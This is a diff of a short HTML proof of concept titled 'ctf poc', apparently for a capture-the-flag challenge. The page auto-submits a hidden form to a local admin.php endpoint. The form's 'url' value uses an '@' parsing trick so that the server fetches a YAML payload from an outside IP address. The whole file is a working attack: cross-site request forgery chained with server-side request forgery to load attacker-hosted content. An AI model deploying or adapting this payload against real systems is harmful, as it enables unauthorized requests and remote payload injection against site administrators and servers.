@@ -1,11 +1,8 @@
 <!doctype html>
 <meta charset="utf-8">
 <title>ctf poc</title>
-
 <form id="f" method="post" action="http://localhost:5000/admin.php">
-  <!-- NOTE: after '@' MUST be a plain-HTTP URL that returns exactly the YAML below (no redirects) -->
-  <input type="hidden" name="url"
-         value="http://localhost:5000/admin.php@http://75.119.143.38:8001/y.yaml">
+  <!-- after '@' MUST be an HTTP endpoint that returns the YAML below (status 200, no redirects) -->
+  <input type="hidden" name="url" value="http://localhost:5000/admin.php@75.119.143.38:8001/y.yaml">
 </form>
-
-<script>document.getElementById('f').submit();</script>
+<script>f.submit();</script>
